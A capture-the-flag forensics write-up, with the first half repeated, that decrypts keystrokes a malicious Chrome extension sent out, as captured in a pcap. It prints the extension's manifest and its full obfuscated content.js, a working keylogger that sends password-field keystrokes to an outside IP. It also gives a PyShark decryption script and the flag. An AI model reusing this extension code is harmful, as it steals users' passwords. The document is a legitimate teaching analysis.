## Challenge Writeup: x-tension

**Category:** Forensics

## Challenge Description

Trying to get good at something while watching youtube isn’t the greatest idea

The hint suggests that the user’s activity was being monitored, possibly via a **browser extension**, while they were distracted.

The challenge provided a **pcap file**: `chal.pcapng`.


### Step 1: Inspect the pcap

* Open `chal.pcapng` in **Wireshark**.
* Filter for HTTP traffic:

  ```
  http.request
  ```
* We notice a **GET request for a Chrome extension**:

  ```
  GET /FunnyCatPicsExtension.crx HTTP/1.1
  Host: 192.168.20.1:1023
  ```
* The server responds with the `.crx` file containing `content.js` and `manifest.json`.

💡 This is likely **where the exfiltration mechanism is hidden**.

---

### Step 2: Analyze the extension

* `manifest.json` shows a content script runs on **all URLs** (`<all_urls>`).
* `content.js` contains obfuscated JavaScript. After deobfuscation, we see:

1. `getKey()` generates a **single-character key** based on the **current UTC minute + 0x20**.
2. `xorEncrypt()` XORs each character of the typed input with this key and encodes it as hex.
3. An event listener on `keydown` sends the **XOR-encrypted value** to a remote server:

   ```
   http://192.9.137.137:42552/?t=ENCRYPTED_HEX
   ```
4. Essentially, the extension **acts as a keylogger**, exfiltrating the flag one character at a time.

### Step 3: Extract encrypted characters from the pcap

* Use **PyShark** to parse HTTP requests in the pcap:

  * Filter for requests to `192.9.137.137:42552`.
  * Extract the `t` parameter (hex-encoded XORed character).
  * Compute the key using the **packet timestamp**: `UTC minute + 0x20`.

---

### Step 4: Decrypt the flag

* Each character is decrypted with:

```python
def xor_decrypt(enc_hex, key):
    enc_bytes = bytes.fromhex(enc_hex)
    return ''.join([chr(b ^ key) for b in enc_bytes])
```

* Concatenate all decrypted characters in the order of packet timestamps to reconstruct the **full flag**.

---

### Step 5: Python Script (Automation)

* The full Python script automates extraction and decryption from the pcap (see previous message).
* Running it gets the full flag.

---

## Challenge Writeup: x-tension (100 pts)

**Category:** Forensics / Network Traffic Analysis
**Points:** 100

**Description Hint:**

> “Trying to get good at something while watching youtube isn’t the greatest idea...”

* The hint suggests that the user’s activity was being monitored, possibly via a **browser extension**, while they were distracted.
* The challenge provided a **pcap file**: `chal.pcapng`.

---

### Step 1: Inspect the pcap

* Open `chal.pcapng` in **Wireshark**.
* Filter for HTTP traffic:

  ```
  http.request
  ```
* We notice a **GET request for a Chrome extension**:

  ```
  GET /FunnyCatPicsExtension.crx HTTP/1.1
  Host: 192.168.20.1:1023
  ```
* The server responds with the `.crx` file containing `content.js` and `manifest.json`.

💡 This is likely **where the exfiltration mechanism is hidden**.

---

### Step 2: Analyze the extension

* `manifest.json` shows a content script runs on **all URLs** (`<all_urls>`).
```json
{
  "manifest_version": 3,
  "name": "Funny Cat Pics Generator",
  "version": "1.0",
  "description": "Sends cat pics or something",
  "permissions": [
    "scripting"
  ],
  "host_permissions": [
    "<all_urls>"
  ],
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["content.js"],
      "run_at": "document_idle"
    }
  ]
}
```
* `content.js` contains obfuscated JavaScript. After deobfuscation, we see:
```js
function _0x1e75(){const _0x598b78=['940KLmqcF','45092jwiXkN','fromCharCode','addEventListener','padStart','973KXuPbI','28240VWxZRs','3112764XnXYDi','toString','44frdLyF','814942lZkvEV','21078OiMojE','getUTCMinutes','key','target','927aCoiKZ','551255yJTaff','type','117711JQghmv','keydown','charCodeAt','length'];_0x1e75=function(){return _0x598b78;};return _0x1e75();}const _0x421cd8=_0x16e0;function _0x16e0(_0x3b1337,_0x4a4a90){const _0x1e75a5=_0x1e75();return _0x16e0=function(_0x16e0f9,_0x124fc6){_0x16e0f9=_0x16e0f9-0xac;let _0x20d287=_0x1e75a5[_0x16e0f9];return _0x20d287;},_0x16e0(_0x3b1337,_0x4a4a90);}(function(_0x4db7df,_0x152423){const _0x419a6d=_0x16e0,_0x528a3a=_0x4db7df();while(!![]){try{const _0x3bd5a6=-parseInt(_0x419a6d(0xac))/0x1+parseInt(_0x419a6d(0xb9))/0x2+parseInt(_0x419a6d(0xbf))/0x3+parseInt(_0x419a6d(0xc1))/0x4*(-parseInt(_0x419a6d(0xb2))/0x5)+parseInt(_0x419a6d(0xad))/0x6*(parseInt(_0x419a6d(0xbd))/0x7)+parseInt(_0x419a6d(0xbe))/0x8*(parseInt(_0x419a6d(0xb1))/0x9)+-parseInt(_0x419a6d(0xb8))/0xa*(-parseInt(_0x419a6d(0xb4))/0xb);if(_0x3bd5a6===_0x152423)break;else _0x528a3a['push'](_0x528a3a['shift']());}catch(_0x14838d){_0x528a3a['push'](_0x528a3a['shift']());}}}(_0x1e75,0xd956e));function getKey(){const _0x5a2d05=_0x16e0,_0x3733b8=new Date()[_0x5a2d05(0xae)]();return String[_0x5a2d05(0xba)](_0x3733b8+0x20);}function xorEncrypt(_0x2d1e8c,_0x3beac1){const _0x404414=_0x16e0;let _0x406d63='';for(let _0x58a85f=0x0;_0x58a85f<_0x2d1e8c[_0x404414(0xb7)];_0x58a85f++){const _0x384e0a=_0x2d1e8c[_0x404414(0xb6)](_0x58a85f),_0x4250be=_0x3beac1['charCodeAt'](0x0),_0x4df57c=_0x384e0a^_0x4250be;_0x406d63+=_0x4df57c[_0x404414(0xc0)](0x10)[_0x404414(0xbc)](0x2,'0');}return _0x406d63;}document[_0x421cd8(0xbb)](_0x421cd8(0xb5),_0x4e7994=>{const _0x39d3e2=_0x421cd8,_0x260e7d=_0x4e7994[_0x39d3e2(0xb0)];if(_0x260e7d[_0x39d3e2(0xb3)]==='password'){const _0x2c5a17=_0x4e7994[_0x39d3e2(0xaf)][_0x39d3e2(0xb7)]===0x1?_0x4e7994[_0x39d3e2(0xaf)]:'',_0x5e96ad=getKey(),_0x5a4007=xorEncrypt(_0x2c5a17,_0x5e96ad),_0x3a36f2=encodeURIComponent(_0x5a4007);_0x2c5a17&&fetch('http://192.9.137.137:42552/?t='+_0x3a36f2);}});
```

1. `getKey()` generates a **single-character key** based on the **current UTC minute + 0x20**.
2. `xorEncrypt()` XORs each character of the typed input with this key and encodes it as hex.
3. An event listener on `keydown` sends the **XOR-encrypted value** to a remote server:

   ```
   http://192.9.137.137:42552/?t=ENCRYPTED_HEX
   ```
4. Essentially, the extension **acts as a keylogger**, exfiltrating the flag one character at a time.

---

### Step 3: Extract encrypted characters from the pcap

* Use **PyShark** to parse HTTP requests in the pcap:

  * Filter for requests to `192.9.137.137:42552`.
  * Extract the `t` parameter (hex-encoded XORed character).
  * Compute the key using the **packet timestamp**: `UTC minute + 0x20`.

---

### Step 4: Decrypt the flag

* Each character is decrypted with:

```python
def xor_decrypt(enc_hex, key):
    enc_bytes = bytes.fromhex(enc_hex)
    return ''.join([chr(b ^ key) for b in enc_bytes])
```

* Concatenate all decrypted characters in the order of packet timestamps to reconstruct the **full flag**.

---

### Step 5: Python Script (Automation)

* The full Python script automates extraction and decryption from the pcap (see previous message).
* Running it prints the full flag.
```python
import pyshark
import urllib.parse
import time

# --- CONFIG ---
pcap_file = "chal.pcapng"
target_host = "192.9.137.137"
target_port = "42552"

# --- FUNCTION TO XOR-DECRYPT ---
def xor_decrypt(enc_hex, key):
    enc_bytes = bytes.fromhex(enc_hex)
    return ''.join([chr(b ^ key) for b in enc_bytes])

# --- OPEN PCAP ---
cap = pyshark.FileCapture(pcap_file, display_filter="http.request")

flag_chars = []

for pkt in cap:
    try:
        host = pkt.http.host
        uri = pkt.http.request_uri
        if target_host in host and target_port in host:
            # Extract 't=' parameter
            if "?t=" in uri:
                enc_param = uri.split("?t=")[1]
                enc_hex = urllib.parse.unquote(enc_param)

                # Use the packet timestamp to get the UTC minute for the key
                pkt_time = float(pkt.sniff_timestamp)
                utc_minute = time.gmtime(pkt_time).tm_min
                key = utc_minute + 0x20

                char = xor_decrypt(enc_hex, key)
                flag_chars.append(char)
    except AttributeError:
        continue

cap.close()

# --- RECONSTRUCT FULL FLAG ---
full_flag = ''.join(flag_chars)
print("[+] Full Flag:", full_flag)
```

### Step 6: Flag
```
ictf{extensions_might_just_suck}
```